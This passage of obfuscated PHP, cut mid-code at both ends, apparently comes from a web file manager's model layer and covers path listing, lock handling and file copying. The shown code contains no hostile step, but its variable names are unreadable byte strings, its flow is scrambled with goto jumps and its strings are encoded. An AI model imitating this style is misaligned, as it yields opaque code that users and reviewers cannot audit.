b¨ÔÌ‡­Œ¯; C¥Ğí•†Ò: return $b‚¬¥•É¤š; goto a’×¨İì¬¢; a’×¨İì¬¢: } private function _listAppendPathRecycle(&$FÙª‘£¨, $d£ÂéôÏ´, $e¤ÍèÇ —) { goto c…»æàÔƒÃ; d…ãÕäÖ¥…: $AºÇÚ±¤ˆñ = explode($Bï†­±íò[8], trim($FÙª‘£¨[$Bï†­±íò[493]], $Bï†­±íò[8])); $EÄª‘èè¢… = implode($Bï†­±íò[8], array_slice($AºÇÚ±¤ˆñ, 2)); $FÙª‘£¨[$Bï†­±íò[493]] = $Bï†­±íò[8] . LNG($Bï†­±íò[496]) . $Bï†­±íò[8] . ltrim($EÄª‘èè¢…, $Bï†­±íò[8]); goto D”³îÔå; c…»æàÔƒÃ: $Bï†­±íò =& $_SERVER[¢ÌÛ]; if (intval($FÙª‘£¨[$Bï†­±íò[398]]) !== self::TYPE_SYSTEM) { return; } if (!in_array($e¤ÍèÇ —, $d£ÂéôÏ´) && $FÙª‘£¨[$Bï†­±íò[396]] != $e¤ÍèÇ —) { return; } goto d…ãÕäÖ¥…; D”³îÔå: $FÙª‘£¨[$Bï†­±íò[486]] = $Bï†­±íò[497] . implode($Bï†­±íò[47], array_slice($d£ÂéôÏ´, 1)) . $Bï†­±íò[47]; if ($FÙª‘£¨[$Bï†­±íò[396]] == $e¤ÍèÇ —) { $FÙª‘£¨[$Bï†­±íò[486]] = $Bï†­±íò[497]; $FÙª‘£¨[$Bï†­±íò[488]] = $Bï†­±íò[495]; $FÙª‘£¨[$Bï†­±íò[28]] = LNG($Bï†­±íò[496]); } $FÙª‘£¨[$Bï†­±íò[498]] = $Bï†­±íò[499]; goto D±†Â‰‹“; D±†Â‰‹“: } protected function _listAppendPathRoot(&$aì—¼ñ…èİ, $Eéùƒíåö÷) { $FÏšÂ©à¨° =& $_SERVER[¢ÌÛ]; $D÷…Ò»Óå = $FÏšÂ©à¨°[33]; if ($aì—¼ñ…èİ[$FÏšÂ©à¨°[398]] == self::TYPE_USER) { if (defined($FÏšÂ©à¨°[452]) && $aì—¼ñ…èİ[$FÏšÂ©à¨°[483]] == USER_ID) { $D÷…Ò»Óå = LNG($FÏšÂ©à¨°[500]); if (!$Eéùƒíåö÷) { $aì—¼ñ…èİ[$FÏšÂ©à¨°[28]] = $D÷…Ò»Óå; } } else { $C¶ßÕÙëôª = Model($FÏšÂ©à¨°[501])->getInfoSimple($aì—¼ñ…èİ[$FÏšÂ©à¨°[483]]); $D÷…Ò»Óå = LNG($FÏšÂ©à¨°[502]) . $FÏšÂ©à¨°[159] . $C¶ßÕÙëôª[$FÏšÂ©à¨°[28]] . $FÏšÂ©à¨°[503]; } } else { if ($aì—¼ñ…èİ[$FÏšÂ©à¨°[398]] == self::TYPE_GROUP) { $C¶ßÕÙëôª = Model($FÏšÂ©à¨°[485])->getInfoSimple($aì—¼ñ…èİ[$FÏšÂ©à¨°[483]]); $D÷…Ò»Óå = $C¶ßÕÙëôª[$FÏšÂ©à¨°[28]]; } else { if ($aì—¼ñ…èİ[$FÏšÂ©à¨°[398]] == self::TYPE_SYSTEM) { $C¶ßÕÙëôª = $this->sourceInfo($Eéùƒíåö÷[0], !0); $D÷…Ò»Óå = $C¶ßÕÙëôª[$FÏšÂ©à¨°[28]]; } } } $D÷…Ò»Óå = $D÷…Ò»Óå ? $FÏšÂ©à¨°[8] . $D÷…Ò»Óå . $FÏšÂ©à¨°[8] : $FÏšÂ©à¨°[8]; return $D÷…Ò»Óå; } protected function _listAppendUser(&$F’×¹÷ßôø) { goto bœù¼¹íæò; bœù¼¹íæò: $a¨¦„è¯ª¨ =& $_SERVER[¢ÌÛ]; $Fß¸éÁ¨Á´ = array_to_keyvalue($F’×¹÷ßôø, $a¨¦„è¯ª¨[33], $a¨¦„è¯ª¨[405]); $dñ‹…Š‰Ï = array_to_keyvalue($F’×¹÷ßôø, $a¨¦„è¯ª¨[33], $a¨¦„è¯ª¨[406]); goto e Ù¨¡ÖÓ§; FÎ‘—ºŠñ‘: unset($dö´È¬î¦Œ); goto e¬Ÿ°’Ì¾; e Ù¨¡ÖÓ§: $eî°Ğ´„›® = array_merge($Fß¸éÁ¨Á´, $dñ‹…Š‰Ï); $E¹Š„ˆ¥ = Model($a¨¦„è¯ª¨[504])->userListInfo($eî°Ğ´„›®); foreach ($F’×¹÷ßôø as &$dö´È¬î¦Œ) { $eäñÕæñË = $dö´È¬î¦Œ[$a¨¦„è¯ª¨[405]]; $dö´È¬î¦Œ[$a¨¦„è¯ª¨[405]] = $E¹Š„ˆ¥[$eäñÕæñË] ? $E¹Š„ˆ¥[$eäñÕæñË] : !1; $eäñÕæñË = $dö´È¬î¦Œ[$a¨¦„è¯ª¨[406]]; $dö´È¬î¦Œ[$a¨¦„è¯ª¨[406]] = $E¹Š„ˆ¥[$eäñÕæñË] ? $E¹Š„ˆ¥[$eäñÕæñË] : !1; if (isset($dö´È¬î¦Œ[$a¨¦„è¯ª¨[443]]) && $dö´È¬î¦Œ[$a¨¦„è¯ª¨[443]][$a¨¦„è¯ª¨[505]]) { $dóñøÃ†Õœ = $GLOBALS[$a¨¦„è¯ª¨[6]][$a¨¦„è¯ª¨[87]][$a¨¦„è¯ª¨[506]]; if ($dö´È¬î¦Œ[$a¨¦„è¯ª¨[443]][$a¨¦„è¯ª¨[507]] <= time() - $dóñøÃ†Õœ) { $this->metaSet($dö´È¬î¦Œ[$a¨¦„è¯ª¨[396]], $a¨¦„è¯ª¨[505], null); $this->metaSet($dö´È¬î¦Œ[$a¨¦„è¯ª¨[396]], $a¨¦„è¯ª¨[507], null); unset($dö´È¬î¦Œ[$a¨¦„è¯ª¨[443]][$a¨¦„è¯ª¨[505]]); continue; } $a£ó’ÅÙÙ = $dö´È¬î¦Œ[$a¨¦„è¯ª¨[443]][$a¨¦„è¯ª¨[505]]; $dö´È¬î¦Œ[$a¨¦„è¯ª¨[443]][$a¨¦„è¯ª¨[508]] = Model($a¨¦„è¯ª¨[504])->getInfoSimpleOuter($a£ó’ÅÙÙ); } } goto FÎ‘—ºŠñ‘; e¬Ÿ°’Ì¾: } public function parentLevelArray($cãÌİµ„Ô°) { $B…âÊÈÉ™ =& $_SERVER[¢ÌÛ]; $cãÌİµ„Ô° = explode($B…âÊÈÉ™[47], trim($cãÌİµ„Ô°, $B…âÊÈÉ™[47])); return array_remove_value($cãÌİµ„Ô°, $B…âÊÈÉ™[495]); } public function listAll($aÈöÀ¾³İÒ) { goto E‹™ãª‡Ò; DÕô‹èˆ’: $this->_listAppendAuth($dåùÂÚŸòî); $this->_listAppendUser($dåùÂÚŸòî); $this->_listAppendPath($dåùÂÚŸòî); goto c®Û£Ê¾Ïô; C÷Îë— ¥Î: $bœøõÛê = array(); foreach ($dåùÂÚŸòî as $A˜¢®´èÊ => $dÙÜì†¯‡) { goto FÜ»Âó¬ˆ¡; FÜ»Âó¬ˆ¡: $AŒ˜÷êÅ²ã = $this->parentLevelArray($dÙÜì†¯‡[$D¯¸Ô‘ËÔ[486]]); array_shift($AŒ˜÷êÅ²ã); $a‹–±ğš…¤ = $AóÇãˆò‘“; goto d‘‰°Ö¡í¾; eØ¦¾âèçé: if (!$dÙÜì†¯‡[$D¯¸Ô‘ËÔ[397]]) { $D»‚·ğ¬ÚÃ[$D¯¸Ô‘ËÔ[445]] = $dÙÜì†¯‡[$D¯¸Ô‘ËÔ[445]]; $D»‚·ğ¬ÚÃ[$D¯¸Ô‘ËÔ[85]] = $dÙÜì†¯‡[$D¯¸Ô‘ËÔ[75]]; } $bœøõÛê[] = $D»‚·ğ¬ÚÃ; goto BóŞŸÖïÉ; déõ½¿ØÅù: $a‹–±ğš…¤ = str_replace($D¯¸Ô‘ËÔ[494], $D¯¸Ô‘ËÔ[8], $a‹–±ğš…¤); $a‹–±ğš…¤ = str_replace($D¯¸Ô‘ËÔ[494], $D¯¸Ô‘ËÔ[8], $a‹–±ğš…¤); $D»‚·ğ¬ÚÃ = array($D¯¸Ô‘ËÔ[414] => str_replace($D¯¸Ô‘ËÔ[494], $D¯¸Ô‘ËÔ[8], $a‹–±ğš…¤), $D¯¸Ô‘ËÔ[515] => intval($dÙÜì†¯‡[$D¯¸Ô‘ËÔ[397]]), $D¯¸Ô‘ËÔ[84] => $this->pathInfoFilter($dÙÜì†¯‡, !0)); goto eØ¦¾âèçé; d‘‰°Ö¡í¾: for ($AÖëÎÁØ• = 0; $AÖëÎÁØ• < count($AŒ˜÷êÅ²ã); $AÖëÎÁØ•++) { $a‹–±ğš…¤ .= $dåùÂÚŸòî[$AŒ˜÷êÅ²ã[$AÖëÎÁØ•]][$D¯¸Ô‘ËÔ[28]] . $D¯¸Ô‘ËÔ[8]; } $a‹–±ğš…¤ .= $dÙÜì†¯‡[$D¯¸Ô‘ËÔ[28]]; if ($dÙÜì†¯‡[$D¯¸Ô‘ËÔ[397]]) { $a‹–±ğš…¤ .= $D¯¸Ô‘ËÔ[8]; } goto déõ½¿ØÅù; BóŞŸÖïÉ: } return $bœøõÛê; goto fë×Ë®ª”©; E‹™ãª‡Ò: $D¯¸Ô‘ËÔ =& $_SERVER[¢ÌÛ]; $C÷íŞÀï = $this->sourceInfo($aÈöÀ¾³İÒ); $D¬Ü††‰êê = array($D¯¸Ô‘ËÔ[509] => array($D¯¸Ô‘ËÔ[510], $C÷íŞÀï[$D¯¸Ô‘ËÔ[486]] . $aÈöÀ¾³İÒ . $D¯¸Ô‘ËÔ[511]), $D¯¸Ô‘ËÔ[512] => 0); goto FòÃêâ»òõ; c®Û£Ê¾Ïô: $dåùÂÚŸòî = array_to_keyvalue($dåùÂÚŸòî, $D¯¸Ô‘ËÔ[396]); $AóÇãˆò‘“ = "\x2f{$C÷íŞÀï[$D¯¸Ô‘ËÔ[28]]}\x2f"; $AóÇãˆò‘“ = $AóÇãˆò‘“ == $D¯¸Ô‘ËÔ[494] ? $D¯¸Ô‘ËÔ[8] : $AóÇãˆò‘“; goto C÷Îë— ¥Î; FòÃêâ»òõ: $CÏ­¸ôøÍ = $D¯¸Ô‘ËÔ[513]; $bÒ¡´¿‡­í = "\x4c\105\106\x54\40\x4a\117\111\x4e\x20{$this->tablePrefix}\x69\157\x5f\146\x69\x6c\145\40\146\x69\x6c\145\x20\x6f\x6e\x20\x73\x6f\165\x72\143\145\56\x66\x69\x6c\x65\x49\104\x20\x3d\40\x66\x69\154\x65\x2e\x66\x69\154\145\x49\104"; $dåùÂÚŸòî = $this->alias($D¯¸Ô‘ËÔ[514])->field($CÏ­¸ôøÍ)->where($D¬Ü††‰êê)->join($bÒ¡´¿‡­í)->select(); goto DÕô‹èˆ’; fë×Ë®ª”©: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($E«ÕœŞ«‘á) { goto CÆ°ÇŠ…®Ø; C´²šˆ­à: $this->_lockEvent($E«ÕœŞ«‘á, array($f‰ßâÀËÚ[519], $f‰ßâÀËÚ[520]), $aàšœÚÊ); $this->_lockCheckEnd($f‰ßâÀËÚ[516], $E«ÕœŞ«‘á); goto Eñ¾áŸ; CÆ°ÇŠ…®Ø: $f‰ßâÀËÚ =& $_SERVER[¢ÌÛ]; if (!$this->allowLock()) { return; } $this->_lockCheck($f‰ßâÀËÚ[516], $E«ÕœŞ«‘á); goto CåÛìÎ²¾; CåÛìÎ²¾: $aàšœÚÊ = 1; $this->_lockEvent($E«ÕœŞ«‘á, array($f‰ßâÀËÚ[517], $f‰ßâÀËÚ[518]), $aàšœÚÊ); $this->_lockParent($E«ÕœŞ«‘á, array($f‰ßâÀËÚ[518]), $aàšœÚÊ); goto C´²šˆ­à; Eñ¾áŸ: } public function lockCopyEnd($Bõ§ÖÔÂÊ¶) { $d…˜ô×½ =& $_SERVER[¢ÌÛ]; if (!$this->allowLock()) { return; } $D²÷˜›ƒÜô = 0; $this->_lockEvent($Bõ§ÖÔÂÊ¶, array($d…˜ô×½[517], $d…˜ô×½[518]), $D²÷˜›ƒÜô); $this->_lockParent($Bõ§ÖÔÂÊ¶, array($d…˜ô×½[518]), $D²÷˜›ƒÜô); $this->_lockEvent($Bõ§ÖÔÂÊ¶, array($d…˜ô×½[519], $d…˜ô×½[520]), $D²÷˜›ƒÜô); } public function lockWriteStart($fã¸ôò‰“, $b¨‘¹™–õä = '') { goto E¯ïŠµ–²; E¯ïŠµ–²: $Fß¿»Ëï™Û =& $_SERVER[¢ÌÛ]; if (!$this->allowLock()) { return; } $this->_lockCheck($Fß¿»Ëï™Û[517], $fã¸ôò‰“); goto FçÒŠÜãè¯; Cà¹Å¶ß˜‰: $this->_lockParent($fã¸ôò‰“, array($Fß¿»Ëï™Û[516], $Fß¿»Ëï™Û[518]), $aË±ğËÀ¤); $this->_lockCheckEnd($Fß¿»Ëï™Û[517], $fã¸ôò‰“); goto b¿¦êâ©§¤; FçÒŠÜãè¯: $aË±ğËÀ¤ = 1; $this->_lockKey($Fß¿»Ëï™Û[521] . $fã¸ôò‰“ . $Fß¿»Ëï™Û[94] . $b¨‘¹™–õä, $aË±ğËÀ¤); $this->_lockEvent($fã¸ôò‰“, array($Fß¿»Ëï™Û[516], $Fß¿»Ëï™Û[518]), $aË±ğËÀ¤); goto Cà¹Å¶ß˜‰; b¿¦êâ©§¤: } public function lockWriteEnd($Dã„—Œ•, $f§ïò¹Ã = '') { $b†Ô‹İåÅØ =& $_SERVER[¢ÌÛ]; if (!$this->allowLock()) { return; } $BÚÜµ¥Û²Á = 0; $this->_lockKey($b†Ô‹İåÅØ[521] . $Dã„—Œ• . $b†Ô‹İåÅØ[94] . $f§ïò¹Ã, $BÚÜµ¥Û²Á); $this->_lockEvent($Dã„—Œ•, array($b†Ô‹İåÅØ[516], $b†Ô‹İåÅØ[518]), $BÚÜµ¥Û²Á); $this->_lockParent($Dã„—Œ•, array($b†Ô‹İåÅØ[516], $b†Ô‹İåÅØ[518]), $BÚÜµ¥Û²Á); } public function lockMoveStart($báŞÜáŠÕñ) { goto Cæš™®œÚƒ; Cæš™®œÚƒ: $aù§ì¯·Ò =& $_SERVER[¢ÌÛ]; if (!$this->allowLock()) { return; } $this->_lockCheck($aù§ì¯·Ò[518], $báŞÜáŠÕñ); goto C§Øõ’ÏÎ; C§Øõ’ÏÎ: $b·‹ ØƒÍ¯ = 1; $this->_lockKey($aù§ì¯·Ò[522] . $báŞÜáŠÕñ, $b·‹ ØƒÍ¯); $this->_lockEvent($báŞÜáŠÕñ, array($aù§ì¯·Ò[516], $aù§ì¯·Ò[517]), $b·‹ ØƒÍ¯); goto bÑµ½øàá; bÑµ½øàá: $this->_lockParent($báŞÜáŠÕñ, array($aù§ì¯·Ò[516], $aù§ì¯·Ò[518]), $b·‹ ØƒÍ¯); $this->_lockEvent($báŞÜáŠÕñ, array($aù§ì¯·Ò[523], $aù§ì¯·Ò[519], $aù§ì¯·Ò[520]), $b·‹ ØƒÍ¯); $this->_lockCheckEnd($aù§ì¯·Ò[518], $báŞÜáŠÕñ); goto B¦‘Üä«¨¬; B¦‘Üä«¨¬: } public function lockMoveEnd($FÆÅ’Ë‘Ù¼) { goto CæáŠóòÂÛ; CæáŠóòÂÛ: $c¤÷—®³Çä =& $_SERVER[¢ÌÛ]; if (!$this->allowLock()) { return; } $eñŠ‡–¶¥Š = 0; goto Céì”ğÆ±; Céì”ğÆ±: $this->_lockKey($c¤÷—®³Çä[522] . $FÆÅ’Ë‘Ù¼, $eñŠ‡–¶¥Š); $this->_lockEvent($FÆÅ’Ë‘Ù¼, array($c¤÷—®³Çä[516], $c¤÷—®³Çä[517]), $eñŠ‡–¶¥Š); $this->_lockParent($FÆÅ’Ë‘Ù¼, array($c¤÷—®³Çä[516], $c¤÷—®³Çä[518]), $eñŠ‡–¶¥Š); goto dÑÒÁ»’ÖÒ; dÑÒÁ»’ÖÒ: $this->_lockEvent($FÆÅ’Ë‘Ù¼, array($c¤÷—®³Çä[523], $c¤÷—®³Çä[519], $c¤÷—®³Çä[520]), $eñŠ‡–¶¥Š); goto aÈ‘±Á¿†¸; aÈ‘±Á¿†¸: } private function _lockCheck($C£Ö·Ôá²Ä, $FÒ–äÁ×—§) { goto Cİ¬±ğ‡„ù; Cİ¬±ğ‡„ù: $E»¼½‰Øµˆ =& $_SERVER[¢ÌÛ]; $cğ‘ÌµÜÕÀ = $this->sourceInfo($FÒ–äÁ×—§); $D‡îÔˆ¢š‰ = $C£Ö·Ôá²Ä . $E»¼½‰Øµˆ[94] . $FÒ–äÁ×—§; goto fĞå¡‡£¯Î; fĞå¡‡£¯Î: $this->_lockTimeStart[$D‡îÔˆ¢š‰] = timeFloat(); if (!is_array($cğ‘ÌµÜÕÀ)) { return; } $Dä©­†Æ¯Õ = LNG($E»¼½‰Øµˆ[524]); goto B†ŠĞ‚ùÂá; B†ŠĞ‚ùÂá: CacheLock::setErrorMsg($E»¼½‰Øµˆ[159] . htmlspecialchars($cğ‘ÌµÜÕÀ[$E»¼½‰Øµˆ[28]]) . $E»¼½‰Øµˆ[503] . $Dä©­†Æ¯Õ); $this->_lockKey($D‡îÔˆ¢š‰, 1); $this->_lockKey($D‡îÔˆ¢š‰, 0); goto F¯¯’ºãç‡; F¯¯’ºãç‡: $AÀŠ…ÚÌÂ£ = array_reverse($this->parentLevelArray($cğ‘ÌµÜÕÀ[$E»¼½‰Øµˆ[486]])); foreach ($AÀŠ…ÚÌÂ£ as $DÚêÁ•˜ ) { $D‡îÔˆ¢š‰ = $C£Ö·Ôá²Ä . $E»¼½‰Øµˆ[525] . $DÚêÁ•˜ ; if (CacheLock::lockGet($E»¼½‰Øµˆ[526] . $D‡îÔˆ¢š‰)) { $cğ‘ÌµÜÕÀ = $this->sourceInfo($DÚêÁ•˜ ); CacheLock::setErrorMsg($E»¼½‰Øµˆ[159] . htmlspecialchars($cğ‘ÌµÜÕÀ[$E»¼½‰Øµˆ[28]]) . $E»¼½‰Øµˆ[503] . $Dä©­†Æ¯Õ); $this->_lockKey($D‡îÔˆ¢š‰, 1); $this->_lockKey($D‡îÔˆ¢š‰, 0); } } goto Dé‹ÑÍ…¥„; Dé‹ÑÍ…¥„: } private function _lockCheckEnd($FÛÒ¶ñÈŞ, $aÂõèìèåî) { goto b¯ìÂ¡áŠ; FíèÏÅÎæÅ: if ($D‰İ—½Á > 0.5) { unset(self::$cacheSourceInfo[$c‰Æğ• ‹[436] . $aÂõèìèåî]); } $f¯É¶ŒØ†Ô = $this->sourceInfo($aÂõèìèåî); if (!$f¯É¶ŒØ†Ô) { show_json(LNG($c‰Æğ• ‹[104]), !1); } goto a‚Ö¬ø’×; D”Õ½½ŸÜÃ: if (!isset($this->_lockTimeStart[$bƒª‚È‡ë¨])) { return; } $D‰İ—½Á = timeFloat() - $this->_lockTimeStart[$bƒª‚È‡ë¨]; unset($this->_lockTimeStart[$bƒª‚È‡ë¨]); goto FíèÏÅÎæÅ; b¯ìÂ¡áŠ: $c‰Æğ• ‹ =& $_SERVER[¢ÌÛ]; $bƒª‚È‡ë¨ = $FÛÒ¶ñÈŞ . $c‰Æğ• ‹[94] . $aÂõèìèåî; CacheLock::setErrorMsg($c‰Æğ• ‹[370]); goto D”Õ½½ŸÜÃ; a‚Ö¬ø’×: } private function _lockParent($DÆôáå¸”¡, $CÁ ã†âò¿, $E»æòã‘) { if (!$this->autoLockSet) { return; } $E¢Á´„ä = $this->sourceInfo($DÆôáå¸”¡); if (!is_array($E¢Á´„ä)) { return; } $DŒ¦Ÿ·ë’ = array_reverse($this->parentLevelArray($E¢Á´„ä[$_SERVER[¢ÌÛ][486]])); foreach ($DŒ¦Ÿ·ë’ as $BÒÊæÆ»¼Š) { $this->_lockEvent($BÒÊæÆ»¼Š, $CÁ ã†âò¿, $E»æòã‘); } } private function _lockEvent($C¶ŸŞ—óƒ¦, $DÕÊ¨†Ãª­, $cˆ¤±ã ôò) { $DÆ‘§—õ¹ =& $_SERVER[¢ÌÛ]; if (!$this->autoLockSet) { return; } foreach ($DÕÊ¨†Ãª­ as $B…ÜâÖ¸Ì‹) { $aî—ÙÇÛ = $B…ÜâÖ¸Ì‹ . $DÆ‘§—õ¹[94] . $C¶ŸŞ—óƒ¦; if ($cˆ¤±ã ôò && CacheLock::lockGet($DÆ‘§—õ¹[526] . $aî—ÙÇÛ)) { continue; } $this->_lockKey($aî—ÙÇÛ, $cˆ¤±ã ôò); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($DŞä•ïˆÏë, $Fù³ÀªÃ‹¼ = 1) { $d™†Ï±·½¤ = $_SERVER[¢ÌÛ][526] . md5($DŞä•ïˆÏë); if ($Fù³ÀªÃ‹¼) { if (isset(self::$_lockItemArr[$d™†Ï±·½¤])) { return; } self::$_lockItemArr[$d™†Ï±·½¤] = 1; CacheLock::lock($d™†Ï±·½¤, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$d™†Ï±·½¤])) { return; } unset(self::$_lockItemArr[$d™†Ï±·½¤]); CacheLock::unlock($d™†Ï±·½¤); } } public function isParentOf($d“¬—Ú†, $bß³…ÉõÙš) { goto cª“¾‡¿†ô; DŞï·ô: $BÛŞñÜ«ë = $eÚºãº²ÉÜ[$A¯Ü…öèİé[486]] . $eÚºãº²ÉÜ[$A¯Ü…öèİé[396]] . $A¯Ü…öèİé[47]; $dˆ„¦ì”ìÛ = $EÙØÄí£‹[$A¯Ü…öèİé[486]] . $EÙØÄí£‹[$A¯Ü…öèİé[396]] . $A¯Ü…öèİé[47]; $f¡Š¾­ò˜Ù = strpos($dˆ„¦ì”ìÛ, $BÛŞñÜ«ë) === 0; goto Eº¼Òµù¤”; cª“¾‡¿†ô: $A¯Ü…öèİé =& $_SERVER[¢ÌÛ]; $eÚºãº²ÉÜ = $this->sourceInfo($d“¬—Ú†); $EÙØÄí£‹ = $this->sourceInfo($bß³…ÉõÙš); goto DŞï·ô; Eº¼Òµù¤”: return $f¡Š¾­ò˜Ù; goto aÁ«ÁÄƒÑ; aÁ«ÁÄƒÑ: } private $targetIsDelete = 0; public function copy($c®’Â·É“Ã, $EìªÔ‘¡, $E¬æ÷øÁ•§ = REPEAT_REPLACE, $aÙÒ×š = '') { goto C¢¬ÊíÆ×­; C¢¬ÊíÆ×­: $DåÎù´‘ôô =& $_SERVER[¢ÌÛ]; $DÇÄÉ“Ä¡Ã = $this->sourceInfo($c®’Â·É“Ã); $e³‰ÑÒ…¯ = $this->sourceInfo($EìªÔ‘¡); goto c‹†Êä“Êñ; FÎÆºµ¡ÎË: $this->targetIsDelete = intval($DÇÄÉ“Ä¡Ã[$DåÎù´‘ôô[423]]); $b¢İÀãŸê = $this->fileNameExistCache($EìªÔ‘¡, $DÇÄÉ“Ä¡Ã[$DåÎù´‘ôô[28]]); $còšì›¯µŞ = $this->_copy($c®’Â·É“Ã, $EìªÔ‘¡, $E¬æ÷øÁ•§, $dºĞÔÁÀ¯, !0, $aÙÒ×š); goto EìÃĞ—Ë´Š; Bõ£ğ™°Ã¢: if ($DÇÄÉ“Ä¡Ã[$DåÎù´‘ôô[397]] == $DåÎù´‘ôô[86] && $b¢İÀãŸê == $còšì›¯µŞ) { $this->folderSizeResetChildren($b¢İÀãŸê); } Model($DåÎù´‘ôô[530])->addAll($dºĞÔÁÀ¯[$DåÎù´‘ôô[528]], array(), !0); if ($b¢İÀãŸê != $còšì›¯µŞ || $DÇÄÉ“Ä¡Ã[$DåÎù´‘ôô[397]] == $DåÎù´‘ôô[86]) { Model($DåÎù´‘ôô[531])->eventCopy($còšì›¯µŞ); } goto aê‰Úø÷àƒ; aê‰Úø÷àƒ: $this->saveAll($dºĞÔÁÀ¯[$DåÎù´‘ôô[529]]); Model($DåÎù´‘ôô[173])->linkAdd($dºĞÔÁÀ¯[$DåÎù´‘ôô[527]]); $this->folderSizeReset($EìªÔ‘¡); goto aˆÍòƒÉ¹; c‹†Êä“Êñ: if (!$DÇÄÉ“Ä¡Ã || !$e³‰ÑÒ…¯ || $e³‰ÑÒ…¯[$DåÎù´‘ôô[397]] != $DåÎù´‘ôô[86]) { return !1; } if ($this->isParentOf($c®’Â·É“Ã, $EìªÔ‘¡)) { return !1; } $Añ·ê²ˆì· = $aÙÒ×š ? $aÙÒ×š : $DÇÄÉ“Ä¡Ã[$DåÎù´‘ôô[28]]; goto eÓÉ«¯«ò; aˆÍòƒÉ¹: $this->updateModifyTime($EìªÔ‘¡); return $còšì›¯µŞ; goto fíÀˆ‘° —; eÓÉ«¯«ò: $this->lockCopyStart($c®’Â·É“Ã); $this->lockWriteStart($EìªÔ‘¡, $Añ·ê²ˆì·); $dºĞÔÁÀ¯ = array($DåÎù´‘ôô[527] => array(), $DåÎù´‘ôô[528] => array(), $DåÎù´‘ôô[529] => array()); goto FÎÆºµ¡ÎË; EìÃĞ—Ë´Š: $this->_childrenListClear(); $this->lockCopyEnd($c®’Â·É“Ã); $this->lockWriteEnd($EìªÔ‘¡, $Añ·ê²ˆì·); goto Bõ£ğ™°Ã¢; fíÀˆ‘° —: } private function _copy($fß°İˆ–¤¸, $fÑ‰Ù‚Á, $DğƒÍ‚Ûáœ, &$FÖ†â”‚Ì, $fÆùèÚœ†º, $eÆßÃª‡™… = '') { goto E»ë‡ëÏƒˆ; cÉºö…‹¶‰: $D«­³‰Ã‘° = $eÆßÃª‡™… ? $eÆßÃª‡™… : $dˆ”¼îÇ™ù[$E½©Ïªâà‘[28]]; $c¡‘„”˜¢‰ = $this->fileNameExistCache($fÑ‰Ù‚Á, $D«­³‰Ã‘°); if ($fÆùèÚœ†º) { $this->_childrenAllMake($fß°İˆ–¤¸); if ($B¹À±±†×Ÿ && $c¡‘„”˜¢‰) { $this->_childrenAllMake($c¡‘„”˜¢‰); } } goto EÉµĞãÒ¨Ã; E»ë‡ëÏƒˆ: $E½©Ïªâà‘ =& $_SERVER[¢ÌÛ]; $dˆ”¼îÇ™ù = $this->sourceInfoCache($fß°İˆ–¤¸); $B¹À±±†×Ÿ = $dˆ”¼îÇ™ù[$E½©Ïªâà‘[397]] == $E½©Ïªâà‘[86]; goto cÉºö…‹¶‰; EÉµĞãÒ¨Ã: if (!$c¡‘„”˜¢‰) { return $this->_copyCreate($fß°İˆ–¤¸, $fÑ‰Ù‚Á, $D«­³‰Ã‘°, $FÖ†â”‚Ì); } $eòœ¤Á™ãŒ = $c¡‘„”˜¢‰; if ($B¹À±±†×Ÿ) { if ($DğƒÍ‚Ûáœ == REPEAT_RENAME_FOLDER) { $D«­³‰Ã‘° = $this->fileNameAutoCache($fÑ‰Ù‚Á, $D«­³‰Ã‘°, $DğƒÍ‚Ûáœ, $B¹À±±†×Ÿ); $eòœ¤Á™ãŒ = $this->_copyCreate($fß°İˆ–¤¸, $fÑ‰Ù‚Á, $D«­³‰Ã‘°, $FÖ†â”‚Ì); } else { $dŠïêÓ¢ñÛ = $this->_childrenList($fß°İˆ–¤¸); foreach ($dŠïêÓ¢ñÛ as $fóäµèöæÕ) { $this->_copy($fóäµèöæÕ[$E½©Ïªâà‘[396]], $c¡‘„”˜¢‰, $DğƒÍ‚Ûáœ, $FÖ†â”‚Ì, !1); } } } else { if ($DğƒÍ‚Ûáœ == REPEAT_RENAME || $DğƒÍ‚Ûáœ == REPEAT_RENAME_FOLDER) { $D«­³‰Ã‘° = $this->fileNameAutoCache($fÑ‰Ù‚Á, $D«­³‰Ã‘°, $DğƒÍ‚Ûáœ, $B¹À±±†×Ÿ); $eòœ¤Á™ãŒ = $this->_copyCreate($fß°İˆ–¤¸, $fÑ‰Ù‚Á, $D«­³‰Ã‘°, $FÖ†â”‚Ì); } else { if ($DğƒÍ‚Ûáœ == REPEAT_REPLACE) { $c£ƒÔÛä«Ò = $this->sourceInfoCache($c¡‘„”˜¢‰); $B‘ÚÇ‰à = $this->fileHistory($c£ƒÔÛä«Ò, $dˆ”¼îÇ™ù[$E½©Ïªâà‘[445]], $dˆ”¼îÇ™ù[$E½©Ïªâà‘[77]]); if ($B‘ÚÇ‰à) { $FÖ†â”‚Ì[$E½©Ïªâà‘[527]][] = $dˆ”¼îÇ™ù[$E½©Ïªâà‘[445]]; } } else { if ($DğƒÍ‚Ûáœ == REPEAT_SKIP) { } } } Hook::trigger($E½©Ïªâà‘[532], array($E½©Ïªâà‘[533], $dˆ”¼îÇ™ù, 0)); } goto CŞ’•ñŒğ; CŞ’•ñŒğ: return $eòœ¤Á™ãŒ; goto fÃÂ£òºŸÔ; fÃÂ£òºŸÔ: } private function _copyCreate($Dé‡¨‘ìç, $c „¤¢ï³, $A³¯Ö¨Õ­”, &$EÚ†‡‚Œğø) { goto BµÜ§…•’‰; F­ñáìÄİÉ: $this->chunkEventSet($cİáòÄÜ¤[541], array($cİáòÄÜ¤[542], $f‰Ò—©Àò, $C²£ŒÔ–Õ‹)); $this->saveAll($Cğ®•†‚”á); return $c‘Ë³‡¥¸; goto B³²‡¡°¨; aÙÜ§ç‘¸: $c×ßâ‡•õä = $this->sourceInfo($c‘Ë³‡¥¸); foreach ($a ÌæùˆÓ„ as $f·è‹©£ì¬) { $eÇöç×°„ø = $this->_makeItemData($f·è‹©£ì¬, $c×ßâ‡•õä, $f·è‹©£ì¬[$cİáòÄÜ¤[28]]); $eÇöç×°„ø[$cİáòÄÜ¤[486]] = $f·è‹©£ì¬[$cİáòÄÜ¤[486]]; $f–ö½’¤Ó»[] = $eÇöç×°„ø; } $this->chunkEventSet($cİáòÄÜ¤[537], array($cİáòÄÜ¤[538], $f‰Ò—©Àò, $C²£ŒÔ–Õ‹)); goto dÔÕ‡Ê¾ùƒ; a„Â²’¿’é: $this->_childrenListAll($Dé‡¨‘ìç, $a ÌæùˆÓ„); 